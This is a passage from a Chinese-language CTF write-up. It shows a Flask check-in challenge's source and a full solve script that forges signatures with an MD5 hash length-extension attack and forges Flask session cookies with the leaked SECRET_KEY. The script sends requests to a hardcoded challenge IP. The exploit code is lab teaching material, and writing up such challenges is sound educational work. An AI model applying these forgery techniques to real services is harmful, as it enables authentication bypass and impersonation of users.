class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/users&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>():<br>    <span class="hljs-keyword">return</span> json.dumps(sign_users)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/flag&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:<br>        <span class="hljs-keyword">if</span> sign_users[user] != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag&#123;杂鱼~&#125;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>    <span class="hljs-keyword">global</span> users, sign_users<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        username = getRandom(<span class="hljs-number">8</span>)<br>        pwd = getRandom(<span class="hljs-number">16</span>)<br>        users[username] = pwd<br>        sign_users[username] = <span class="hljs-number">0</span><br>    users[<span class="hljs-string">&quot;student&quot;</span>] = <span class="hljs-string">&quot;student&quot;</span><br>    sign_users[<span class="hljs-string">&quot;student&quot;</span>] = <span class="hljs-number">0</span><br><br>init()<br></code></pre></td></tr></table></figure><p>题目的要求是64个用户全部签到就可以得到flag了</p><p>访问<code>/users</code>可以得到用户的信息</p><p><code>/login</code> 路由可以登陆</p><p><code>/</code> 路由是签到的</p><p><code>/flag</code>可以得到flag</p><p>定位一下关键脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_sign</span>(<span class="hljs-params">sign, username, msg, salt</span>):<br>    <span class="hljs-keyword">if</span> sign == md5(salt + msg + username):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;sign&#x27;</span>) == <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) == <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> session.get(<span class="hljs-string">&#x27;msg&#x27;</span>) == <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    sign = session.get(<span class="hljs-string">&#x27;sign&#x27;</span>)<br>    username = session.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    msg = session.get(<span class="hljs-string">&#x27;msg&#x27;</span>)<br>    <span class="hljs-keyword">if</span> check_sign(sign, username, msg, salt):<br>        sign_users[username.decode()] = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;签到成功&quot;</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以知道，只要session里的 <code>sign</code> 和最终 <code>md5(salt + msg + username)</code> 相等即可签到成功</p><p>这里的salt是未知的，但最初的账号 student 的所有信息是已知的，可以用这个账号的相关信息来做hash长度拓展攻击</p><p>hash长度拓展之前打base有个现成的脚本</p><p>接着是session伪造，<code>SECRET_KEY</code> 已经给出是 <code>Th1s_is_5ecr3t_k3y</code>可以调用<code>flask_session_cookie_manager3.py</code>里的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span><br><br>rotate_amounts = [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>,<br>                  <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>,<br>                  <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>,<br>                  <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>]<br><br>constants = [<span class="hljs-built_in">int</span>(<span class="hljs-built_in">abs</span>(math.sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-number">2</span> ** <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br><br>functions = <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> b, c, d: (b &amp; c) | (~b &amp; d)] + \<br>            <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> b, c, d: (d &amp; b) | (~d &amp; c)] + \<br>            <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> b, c, d: b ^ c ^ d] + \<br>            <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> b, c, d: c ^ (b | ~d)]<br><br>index_functions = <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> i: i] + \<br>                  <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> i: (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span>] + \<br>                  <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> i: (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span>] + \<br>                  <span class="hljs-number">16</span> * [<span class="hljs-keyword">lambda</span> i: (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_init_values</span>(<span class="hljs-params">A: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x67452301</span>, B: <span class="hljs-built_in">int</span> = <span class="hljs-number">0xefcdab89</span>, C: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x98badcfe</span>, D: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x10325476</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>    <span class="hljs-keyword">return</span> [A, B, C, D]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">left_rotate</span>(<span class="hljs-params">x, amount</span>):<br>    x &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; amount) | (x &gt;&gt; (<span class="hljs-number">32</span> - amount))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_message</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。</span><br><span class="hljs-string">    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span><br><span class="hljs-string">    填充的方法如下：</span><br><span class="hljs-string">        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span><br><span class="hljs-string">        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。</span><br><span class="hljs-string">    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    orig_len_in_bits = (<span class="hljs-number">8</span> * <span class="hljs-built_in">len</span>(msg)) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    msg += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x80</span>])<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> != <span class="hljs-number">56</span>:<br>        msg += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x00</span>])<br>    msg += orig_len_in_bits.to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">return</span> msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">message: <span class="hljs-built_in">bytes</span>, A: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x67452301</span>, B: <span class="hljs-built_in">int</span> = <span class="hljs-number">0xefcdab89</span>, C: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x98badcfe</span>, D: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x10325476</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    message = padding_message(message)<br>    hash_pieces = get_init_values(A, B, C, D)[:]<br>    <span class="hljs-keyword">for</span> chunk_ofst <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(message), <span class="hljs-number">64</span>):<br>        a, b, c, d = hash_pieces<br>        chunk = message[chunk_ofst:chunk_ofst + <span class="hljs-number">64</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            f = functions[i](b, c, d)<br>            g = index_functions[i](i)<br>            to_rotate = a + f + constants[i] + <span class="hljs-built_in">int</span>.from_bytes(chunk[<span class="hljs-number">4</span> * g:<span class="hljs-number">4</span> * g + <span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            a, b, c, d = d, new_b, b, c<br>        <span class="hljs-keyword">for</span> i, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>([a, b, c, d]):<br>            hash_pieces[i] += val<br>            hash_pieces[i] &amp;= <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(x &lt;&lt; (<span class="hljs-number">32</span> * i) <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(hash_pieces))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_to_hex</span>(<span class="hljs-params">digest: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    raw = digest.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(raw, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5</span>(<span class="hljs-params">message: <span class="hljs-built_in">bytes</span>, A: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x67452301</span>, B: <span class="hljs-built_in">int</span> = <span class="hljs-number">0xefcdab89</span>, C: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x98badcfe</span>, D: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x10325476</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> md5_to_hex(md5(message, A, B, C, D))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_attack</span>(<span class="hljs-params">message: <span class="hljs-built_in">bytes</span>, A: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x67452301</span>, B: <span class="hljs-built_in">int</span> = <span class="hljs-number">0xefcdab89</span>, C: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x98badcfe</span>,</span><br><span class="hljs-params">               D: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x10325476</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    hash_pieces = get_init_values(A, B, C, D)[:]<br>    <span class="hljs-keyword">for</span> chunk_ofst <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(message), <span class="hljs-number">64</span>):<br>        a, b, c, d = hash_pieces<br>        chunk = message[chunk_ofst:chunk_ofst + <span class="hljs-number">64</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            f = functions[i](b, c, d)<br>            g = index_functions[i](i)<br>            to_rotate = a + f + constants[i] + <span class="hljs-built_in">int</span>.from_bytes(chunk[<span class="hljs-number">4</span> * g:<span class="hljs-number">4</span> * g + <span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            a, b, c, d = d, new_b, b, c<br>        <span class="hljs-keyword">for</span> i, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>([a, b, c, d]):<br>            hash_pieces[i] += val<br>            hash_pieces[i] &amp;= <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(x &lt;&lt; (<span class="hljs-number">32</span> * i) <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(hash_pieces))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_init_values_from_hash_str</span>(<span class="hljs-params">real_hash: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        real_hash: 真实的hash结算结果</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns: 哈希初始化值[A, B, C, D]</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    str_list: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>] = [real_hash[i * <span class="hljs-number">8</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    <span class="hljs-comment"># 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span> + s, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_list]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5_attack_materials</span>(<span class="hljs-params">origin_msg: <span class="hljs-built_in">bytes</span>, key_len: <span class="hljs-built_in">int</span>, real_hash: <span class="hljs-built_in">str</span>, append_data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        origin_msg: 原始的消息字节流</span><br><span class="hljs-string">        key_len: 原始密钥（盐）的长度</span><br><span class="hljs-string">        real_hash: 计算出的真实的hash值</span><br><span class="hljs-string">        append_data: 需要添加的攻击数据</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns: 发起攻击需要的物料信息</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &#x27;attack_fake_msg&#x27;: bytes([...]),</span><br><span class="hljs-string">            &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    init_values = get_init_values_from_hash_str(real_hash)<br>    <span class="hljs-comment"># print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span><br>    <span class="hljs-comment"># 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span><br>    fake_key: <span class="hljs-built_in">bytes</span> = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(key_len)])<br>    <span class="hljs-comment"># 计算出加了append_data后的真实填充数据</span><br>    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)<br>    <span class="hljs-comment"># 攻击者提前计算添加了攻击数据的哈希</span><br>    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[<span class="hljs-built_in">len</span>(padding_message(fake_key + origin_msg)):],<br>                                              A=init_values[<span class="hljs-number">0</span>],<br>                                              B=init_values[<span class="hljs-number">1</span>],<br>                                              C=init_values[<span class="hljs-number">2</span>],<br>                                              D=init_values[<span class="hljs-number">3</span>]))<br>    fake_padding_data = padding_message(fake_key + origin_msg)[<span class="hljs-built_in">len</span>(fake_key + origin_msg):]<br>    attack_fake_msg = origin_msg + fake_padding_data + append_data<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;attack_fake_msg&#x27;</span>: attack_fake_msg, <span class="hljs-string">&#x27;attack_hash_value&#x27;</span>: attack_hash_value&#125;<br><br><br><br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><span class="hljs-keyword">import</span> requests, json, time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        <span class="hljs-variable language_">self</span>.secret_key = secret_key<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">session_decode</span>(<span class="hljs-params">session_cookie_value, secret_key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br>    app = MockApp(secret_key)<br>    si = SecureCookieSessionInterface()<br>    s = si.get_signing_serializer(app)<br>    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">session_encode</span>(<span class="hljs-params">session_cookie_structure, secret_key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        app = MockApp(secret_key)<br>        <span class="hljs-comment"># session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br>        si = SecureCookieSessionInterface()<br>        s = si.get_signing_serializer(app)<br>        <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req_index</span>(<span class="hljs-params">url, cookie</span>):<br>    <span class="hljs-comment"># headers = &#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;</span><br>    cookies = &#123;<span class="hljs-string">&quot;session&quot;</span>:cookie&#125;<br>    r = requests.get(url, cookies=cookies).text<br>    <span class="hljs-comment"># print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;签到成功&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r:<br>        <span class="hljs-comment"># print(cookie)</span><br>        time.sleep(<span class="hljs-number">1</span>)<br>        req_index(url, cookie)<br>        <span class="hljs-comment"># print(r)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req_user</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> json.loads(requests.get(url).text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req_login</span>(<span class="hljs-params">url</span>):<br>    data = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;student&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;student&quot;</span>&#125;<br>    cookie = requests.post(url, data).headers[<span class="hljs-string">&quot;Set-Cookie&quot;</span>][<span class="hljs-number">8</span>:].split(<span class="hljs-string">&#x27;;&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(cookie)</span><br>    <span class="hljs-keyword">return</span> cookie<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash_Attack</span>(<span class="hljs-params">md5_value, key_len, data, attack_data</span>):<br>    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)<br>    <span class="hljs-comment"># print(data)</span><br>    res = &#123;<span class="hljs-string">&quot;username&quot;</span>:attack_data, <span class="hljs-string">&quot;msg&quot;</span>:attack_materials[<span class="hljs-string">&#x27;attack_fake_msg&#x27;</span>][:-<span class="hljs-built_in">len</span>(attack_data)], <span class="hljs-string">&quot;sign&quot;</span>:attack_materials[<span class="hljs-string">&#x27;attack_hash_value&#x27;</span>].encode()&#125;<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://210.44.150.15:47666/&quot;</span><br>    cookie = req_login(url+<span class="hljs-string">&#x27;login&#x27;</span>)<br>    users = req_user(url+<span class="hljs-string">&#x27;users&#x27;</span>)<br>    secret_key = <span class="hljs-string">&quot;Th1s_is_5ecr3t_k3y&quot;</span><br>    res = session_decode(cookie, secret_key)<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:<br>        <span class="hljs-keyword">if</span> users[user] == <span class="hljs-number">0</span>:<br>            res = hash_Attack(res[<span class="hljs-string">&quot;sign&quot;</span>], <span class="hljs-number">16</span>, res[<span class="hljs-string">&quot;msg&quot;</span>]+res[<span class="hljs-string">&quot;username&quot;</span>], user.encode())<br>            res2 = session_encode(res, secret_key)<br>            <span class="hljs-comment"># time.sleep(1)</span><br>            r = req_index(url, res2)<br></code></pre></td></tr></table></figure><p>自己一开始其实已经搓好脚本了，但是一直调用不好，就直接上官p了</p><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h2><h3 id="魔鬼的步伐"><a class="markdownIt-Anchor" href="#魔鬼的步伐"></a> 